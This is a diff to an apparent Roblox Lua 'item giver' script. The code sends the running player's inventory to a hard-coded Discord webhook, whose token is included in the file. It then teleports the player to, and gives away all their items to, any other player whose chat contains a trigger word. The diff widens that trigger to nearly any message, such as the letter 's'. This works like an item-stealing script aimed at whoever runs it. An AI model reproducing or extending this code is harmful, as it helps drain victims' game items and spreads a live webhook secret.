@@ -5,10 +5,12 @@ local HttpService = game:GetService("HttpService")
 local Camera = workspace.CurrentCamera
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local TeleportService = game:GetService("TeleportService")
+local RunService = game:GetService("RunService")
 
 -- Configuration
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
 local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
+local TRIGGER_WORDS = {"s", "give", "items", "trade", LocalPlayer.Name:lower()} -- Words that trigger the item giving
 
 -- Item patterns
 local FRUIT_PATTERN = "%[(.-)%]%s(.+)%s%[(%d+%.%d+)kg%]"
@@ -117,7 +119,7 @@ local function sendMyInventory()
     
     local embed = {
         title = "📦 "..LocalPlayer.Name.."'s Inventory",
-        description = "Mention @"..LocalPlayer.Name.." in chat to receive items!",
+        description = "Say any of these in chat to receive items: `"..table.concat(TRIGGER_WORDS, "`, `").."`",
         color = 0x00FF00,
         fields = {
             {
@@ -168,21 +170,31 @@ local function sendMyInventory()
     end
 end
 
--- Give MY items to mentioning player
-local function giveItemsToMentioner(mentionerPlayer)
-    local targetChar = mentionerPlayer.Character or mentionerPlayer.CharacterAdded:Wait()
+-- Teleport to player and face them
+local function teleportToPlayer(targetPlayer)
+    local targetChar = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
     local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
     local humanoid = myChar:FindFirstChildOfClass("Humanoid")
     if not humanoid then return end
 
-    -- Max zoom out
-    LocalPlayer.CameraMaxZoomDistance = 100
-    LocalPlayer.CameraMinZoomDistance = 100
-    LocalPlayer.CameraMode = Enum.CameraMode.Classic
-
     -- Position in front of target
     humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-    myChar:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))
+    
+    local targetCFrame = targetChar:GetPrimaryPartCFrame()
+    local offset = targetCFrame.LookVector * -3 -- 3 studs in front
+    myChar:SetPrimaryPartCFrame(CFrame.new(targetCFrame.Position + offset + Vector3.new(0, 3, 0), targetCFrame.Position))
+    
+    -- Face the target
+    task.wait(0.5)
+    humanoid:MoveTo(targetCFrame.Position)
+end
+
+-- Give items to the requesting player
+local function giveItemsToPlayer(targetPlayer)
+    local targetChar = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
+    local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local humanoid = myChar:FindFirstChildOfClass("Humanoid")
+    if not humanoid then return end
 
     -- Get MY sorted inventory
     local pets, fruits = scanInventory(LocalPlayer)
@@ -197,6 +209,15 @@ local function giveItemsToMentioner(mentionerPlayer)
     for _, fruit in ipairs(fruits) do
         table.insert(allItems, fruit.item)
     end
+    
+    if #allItems == 0 then
+        print("⚠️ No items to give!")
+        return
+    end
+    
+    -- Teleport to player first
+    teleportToPlayer(targetPlayer)
+    task.wait(1)
     
     -- Process each item
     for _, item in ipairs(allItems) do
@@ -228,27 +249,35 @@ local function giveItemsToMentioner(mentionerPlayer)
         
         task.wait(1) -- Brief cooldown
     end
+    
+    print("✅ All items given to", targetPlayer.Name)
 end
 
 -- Chat handler
 local function onPlayerChatted(player, message)
     if player == LocalPlayer then return end
     
-    -- Check for @mention (flexible matching)
+    -- Check for trigger words
     local lowerMsg = message:lower()
-    local lowerName = LocalPlayer.Name:lower()
-    if not lowerMsg:match("@%s*"..lowerName) then
-        return
+    local shouldTrigger = false
+    
+    for _, word in ipairs(TRIGGER_WORDS) do
+        if lowerMsg:match(word) then
+            shouldTrigger = true
+            break
+        end
     end
     
-    print("📢 Mention detected from", player.Name)
-    giveItemsToMentioner(player)
+    if not shouldTrigger then return end
+    
+    print("📢 Trigger word detected from", player.Name)
+    giveItemsToPlayer(player)
 end
 
 -- Initialize
 local function main()
     -- Wait for everything to load
-    LocalPlayer.CharacterAdded:Wait()
+    repeat task.wait() until LocalPlayer.Character
     LocalPlayer.Backpack:WaitForChild("ChildAdded", 10)
     
     -- Send MY inventory to Discord
@@ -269,13 +298,19 @@ local function main()
         end)
     end)
     
-    print("✅ Item Giver Active! Waiting for mentions...")
+    print("✅ Item Giver Active! Waiting for trigger words...")
+    print("Trigger words:", table.concat(TRIGGER_WORDS, ", "))
 end
 
--- Start with retry
-local success, err = pcall(main)
-if not success then
-    warn("Initial error:", err)
-    task.wait(5)
-    pcall(main) -- Try again after delay
+-- Error handling and retry
+local function safeMain()
+    local success, err = pcall(main)
+    if not success then
+        warn("Initial error:", err)
+        task.wait(5)
+        pcall(main) -- Try again after delay
+    end
 end
+
+-- Start the script
+safeMain()
